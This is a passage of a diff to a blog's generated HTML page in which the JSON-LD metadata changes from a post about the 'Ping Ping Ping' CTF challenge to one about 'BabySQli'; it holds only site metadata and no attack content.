         tozashQuestion(title, message, option, success, cancel, done);
       });
     } else {
@@ -4587,7 +4582,7 @@ volantis.pjax.push(bindToggleButton);
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"hacker-newbie blog","url":"https://hacker-hkl.github.io/","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png"},"sameAs":["https://github.com/volantis-x"]},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://hacker-hkl.github.io/","name":"hacker-newbie blog"}},{"@type":"ListItem","position":2,"item":{"@id":"https://hacker-hkl.github.io/categories/ctf/","name":"ctf"}},{"@type":"ListItem","position":2,"item":{"@id":"https://hacker-hkl.github.io/categories/ctf/buuctf-web/","name":"buuctf-web"}},{"@type":"ListItem","position":3,"item":{"@id":"https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping Ping Ping/","name":"【GXYCTF2019】Ping Ping Ping"}}]},{"@context":"http://schema.org","@type":"BlogPosting","headline":"【GXYCTF2019】Ping Ping Ping","description":"","datePublished":"2021-07-17T16:00:00.000Z","dateModified":"2021-08-25T07:56:54.963Z","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/"},"author":{"@type":"Person"},"publisher":{"@type":"Organization","name":"hacker-newbie blog","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://hacker-hkl.github.io/2021/07/18/[GXYCTF2019]Ping%20Ping%20Ping/","wordCount":0,"articleSection":"ctf"}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"hacker-newbie blog","url":"https://hacker-hkl.github.io/","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","image":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png"},"sameAs":["https://github.com/volantis-x"]},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://hacker-hkl.github.io/","name":"hacker-newbie blog"}},{"@type":"ListItem","position":2,"item":{"@id":"https://hacker-hkl.github.io/categories/ctf/","name":"ctf"}},{"@type":"ListItem","position":2,"item":{"@id":"https://hacker-hkl.github.io/categories/ctf/buuctf-web/","name":"buuctf-web"}},{"@type":"ListItem","position":3,"item":{"@id":"https://hacker-hkl.github.io/2021/07/11/babySQLi/","name":"【GXYCTF2019】BabySQli"}}]},{"@context":"http://schema.org","@type":"BlogPosting","headline":"【GXYCTF2019】BabySQli","description":"","datePublished":"2021-07-10T16:00:00.000Z","dateModified":"2021-08-25T07:55:07.267Z","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://hacker-hkl.github.io/2021/07/11/babySQLi/"},"author":{"@type":"Person"},"publisher":{"@type":"Organization","name":"hacker-newbie blog","logo":{"@type":"ImageObject","url":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://hacker-hkl.github.io/2021/07/11/babySQLi/","wordCount":0,"articleSection":"ctf"}]</script>
 
 
 <!-- more -->
